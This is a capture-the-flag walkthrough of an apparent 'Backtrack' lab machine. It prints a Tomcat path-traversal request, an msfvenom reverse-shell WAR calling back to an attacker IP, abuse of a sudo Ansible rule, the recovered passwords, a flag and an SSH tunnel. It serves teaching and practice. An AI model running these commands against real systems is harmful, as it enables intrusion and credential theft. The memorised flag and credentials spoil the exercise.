Objective

The purpose of this project is to identify and exploit security vulnerabilities in a simulated Capture The Flag (CTF) environment named "Backtrack". The goal is to gain elevated access through multiple user accounts by leveraging misconfigurations, weak credentials, and insecure services.

Initial Access: Exploiting Tomcat

We discovered that Apache Tomcat is exposed on port 8080. Using a path traversal vulnerability, we accessed the tomcat-users.xml configuration file and extracted valid credentials:

curl --path-as-is http://backtrack.thm:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml

Output:

<user username="tomcat" password="OPx52k53D8OkTZpx4fr" roles="manager-script"/>

We then used these credentials to upload a reverse shell in .war format to the Tomcat Manager:

msfvenom -p java/shell_reverse_tcp LHOST=10.10.129.161 LPORT=1234 -f war -o pwn.war
curl -v -u tomcat:OPx52k53D8OkTZpx4fr --upload-file pwn.war "http://backtrack.thm:8080/manager/text/deploy?path=/pwn&update=true"

We received a reverse shell and executed the following:

cat /opt/tomcat/flag1.txt

Flag 1:

THM{823e4e40ead9683b06a8194eab01cee8}

Privilege Escalation via Ansible Misconfiguration

We ran sudo -l and found the following:

sudo -l

Output:

User tomcat may run the following commands on Backtrack:
    (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml

Using this, we created a custom playbook to read a file owned by wilbur:

echo '- hosts: localhost
  tasks:
    - name: Read wilbur secrets
      shell: cat /home/wilbur/.just_in_case.txt > /tmp/wilbur_secret.txt' > /tmp/read_wilbur.yml

sudo -u wilbur /usr/bin/ansible-playbook /tmp/read_wilbur.yml
cat /tmp/wilbur_secret.txt

Output:

wilbur:mYe317Tb9qTNrWFND7KF

We successfully retrieved the password for the user wilbur.

Switching to Wilbur User

su - wilbur

Password:

mYe317Tb9qTNrWFND7KF

Exploring Wilbur’s Home Directory

ls
cat from_orville.txt

Contents:

email : orville@backtrack.thm
password : W34r3B3773r73nP3x3l$

This reveals credentials for accessing a local web application.

Port Forwarding via SSH Tunnel

To access the web app (running locally on port 3000), we used SSH tunneling:

ssh -L 9999:127.0.0.1:3000 wilbur@backtrack.thm

This forwards localhost:3000 on the target to port 9999 on our machine. You can now access the app via:

http://localhost:9999

Use the credentials:

Email: orville@backtrack.thm

Password: W34r3B3773r73nP3x3l$

Summary So Far

Gained initial access via Tomcat upload.

Escalated to read wilbur's secrets using Ansible.

Switched to wilbur with extracted credentials.

Discovered web app credentials.

Forwarded the local port to analyze the web application.

Next Steps:

Analyze the web app for further vulnerabilities (LFI, RCE, etc.).

Explore escalation from wilbur or pivoting to orville.

Document additional flags found.

This project highlights the importance of proper file permissions, limited user privileges, and secure service configurations.
